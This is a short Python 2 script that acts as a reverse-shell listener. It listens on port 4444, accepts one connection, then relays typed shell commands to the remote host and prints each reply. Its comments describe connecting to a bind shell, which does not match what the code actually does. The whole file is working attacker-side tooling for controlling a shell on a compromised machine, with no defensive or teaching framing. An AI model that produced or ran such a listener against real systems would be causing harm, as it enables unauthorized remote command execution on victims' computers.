#! /usr/bin/env python

import socket
addr = '0.0.0.0'
port = 4444

# try and connect to a bind shell
try:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((addr, port))
    
    try :
        listener.listen(1)
        interface = listener.getsockname()[0]
        port = listener.getsockname()[1]
        print("[+] Listening on <%s:%d>" % (interface, port))
        (s, address) = listener.accept()
        print "[+] Connected\n"
        while 1:  
            cmd = raw_input("(sh) $ ");
            s.send(cmd + "\n");  
            result = s.recv(1024).strip();  
            if not len(result):  
                print "[+] Empty response."
                s.close()
                break;  
            print(result);
    except socket.timeout:
        print("[!] Error: Connection timed out")
    except socket.error, err:
        print("[!] Error: Connection lost")
        print(err)

    except KeyboardInterrupt:
        print "\n[+] ^C Received, closing connection"
        s.close()
    except EOFError:
        print "\n[+] ^D Received, closing connection"
        s.close()

except socket.error:
    print "[+] Unable to connect to bind shell."

